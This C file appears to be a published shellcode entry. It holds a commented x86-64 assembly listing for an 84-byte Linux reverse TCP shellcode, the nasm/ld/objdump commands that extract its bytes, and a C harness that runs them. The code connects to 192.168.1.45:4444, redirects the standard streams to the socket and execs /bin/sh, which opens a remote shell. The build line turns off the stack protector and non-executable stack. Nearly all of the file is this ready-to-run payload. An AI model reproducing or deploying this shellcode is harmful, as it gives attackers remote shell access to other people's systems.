/*
 Title: Linux/x86-64 - Reverse TCP shellcode - 84 bytes
 Author: Manuel Mancera (@sinkmanu)
 Tested on: 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64
GNU/Linux

----------------- Assembly code -------------------

section .text
        global _start

_start:
        push 0x2d01a8c0                         ; Address (192.168.1.45)
        push word 0x5c11                        ; Port (4444)
        push word 2                             ; Address family -
AF_INET (0x2)
        push 42                                 ; connect syscall
        push byte 16                            ; length
        push byte 41                            ; socket syscall
        push byte 1                             ; type - SOCK_STREAM (0x1)
        push byte 2                             ; family - AF_INET (0x2)

        pop rdi                                 ; family
        pop rsi                                 ; type
        xor rdx, rdx                            ; protocol
        pop rax                                 ; socket syscall
        syscall

        mov rdi, rax                            ; sockfd
        pop rdx                                 ; length
        pop rax                                 ; connect syscall
        mov rsi, rsp                            ; sockaddr
        syscall

        xor rsi, rsi
loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle loop

        xor rax, rax
        mov rdi, 0x68732f6e69622f2f
        xor rsi, rsi
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall


---------------------------------------------------
$ nasm -f elf64 reverse-tcp-shell.asm -o reverse-tcp-shell.o
$ ld reverse-tcp-shell.o -o reverse-tcp-shell
$ objdump -d ./reverse-tcp-shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2
-d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/
/\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x68\xc0\xa8\x01\x2d\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode
Length: 84 bytes

*/


#include <stdio.h>
#include <string.h>

const char code[] =  \
"\x68\xc0\xa8\x01\x2d\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05";

int main()
{
    printf("Length: %d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}